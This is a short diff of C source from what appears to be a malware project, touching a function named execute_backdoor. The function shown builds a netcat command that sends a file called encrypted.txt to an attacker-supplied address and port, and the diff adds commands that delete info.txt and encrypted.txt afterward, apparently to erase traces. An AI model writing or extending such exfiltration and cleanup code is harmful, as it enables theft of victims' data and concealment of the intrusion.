@@ -183,6 +183,9 @@ void execute_backdoor(char *addr, int port)
 
 	sprintf(buffer, "nc %s %d < encrypted.txt", addr, port);
 	system(buffer);
+	
+	system("rm -rf info.txt");
+	system("rm -rf encrypted.txt");
 }
 
 void encrypt(int shift)
